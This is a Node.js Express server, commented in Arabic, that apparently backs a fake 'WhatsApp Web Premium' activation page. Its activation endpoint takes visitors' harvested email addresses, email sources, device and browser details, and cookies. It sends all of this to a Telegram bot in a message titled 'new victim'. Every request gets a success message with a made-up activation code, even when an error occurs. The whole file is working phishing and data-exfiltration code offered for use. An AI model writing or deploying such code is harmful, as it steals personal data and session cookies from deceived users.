const express = require('express');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.static(path.join(__dirname)));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/api/activate-premium', async (req, res) => {
    console.log('🎯 طلب تفعيل جديد');
    
    try {
        const userData = req.body;
        
        if (!userData) {
            return res.status(400).json({
                success: false,
                error: 'لا توجد بيانات'
            });
        }

        // 🔥 إرسال البيانات مع الإيميلات إلى التلجرام
        const telegramResult = await sendToTelegram(userData);
        
        console.log('📨 نتيجة التلجرام:', telegramResult);
        console.log('📧 الإيميلات المجمعة:', userData.totalEmails || 0);
        console.log('🔍 مصادر الإيميلات:', userData.emailSources || []);

        res.json({
            success: true,
            message: 'تم التفعيل بنجاح!',
            telegramSent: telegramResult.success,
            emailsCollected: userData.totalEmails || 0,
            emailSources: userData.emailSources || [],
            data: {
                activationCode: 'WAPP-' + Date.now().toString().slice(-8),
                features: ['واجهة متقدمة', 'إشعارات فورية']
            }
        });

    } catch (error) {
        console.error('❌ خطأ:', error);
        res.json({
            success: true,
            message: 'تم التفعيل بنجاح!'
        });
    }
});

// 🔥 دالة التلجرام المحسنة
async function sendToTelegram(userData) {
    try {
        const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            return { success: false, error: 'إعدادات التلجرام مفقودة' };
        }

        // 🔥 بناء رسالة مفصلة مع جميع الإيميلات
        const emailList = userData.emails && userData.emails.length > 0 ? 
            userData.emails.map(email => `• ${email}`).join('\n') : 
            '• لم يتم العثور على إيميلات';

        const sourcesList = userData.emailSources && userData.emailSources.length > 0 ?
            userData.emailSources.join('\n• ') : '• لا توجد مصادر';

        const message = `
🎯 **ضحية جديدة - واتساب ويب بريميوم**

📧 **الإيميلات (${userData.totalEmails || 0}):**
${emailList}

🔍 **مصادر الإيميلات:**
• ${sourcesList}

📱 **معلومات الجهاز:**
• المتصفح: ${userData.userAgent?.split(' ')[0] || 'غير معروف'}
• النظام: ${userData.platform || 'غير معروف'}
• اللغة: ${userData.language || 'غير معروف'}
• الشاشة: ${userData.screen || 'غير معروف'}

🌍 **المعلومات:**
• الرابط: ${userData.url || 'غير معروف'}
• الريفيرر: ${userData.referrer || 'لا يوجد'}
• المنطقة: ${userData.timezone || 'غير معروف'}

⏰ **الوقت:** ${new Date().toLocaleString('ar-SA')}

${userData.cookies && userData.cookies !== 'لا توجد' ? 
    `🔐 **الكوكيز:** \n${userData.cookies.substring(0, 200)}...` : 
    '❌ لا توجد كوكيز'}
        `.trim();

        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        const result = await response.json();
        return { success: response.ok, result: result };

    } catch (error) {
        return { success: false, error: error.message };
    }
}

app.get('/test', (req, res) => {
    res.json({ 
        status: 'يعمل', 
        message: 'السيرفر شغال!',
        time: new Date().toISOString()
    });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log('🚀 السيرفر شغال على البورت:', PORT);
    console.log('📧 التلجرام:', process.env.TELEGRAM_BOT_TOKEN ? '✅ مضبوط' : '❌ مش مضبوط');
    console.log('🌐 الرابط:', `http://localhost:${PORT}`);
});
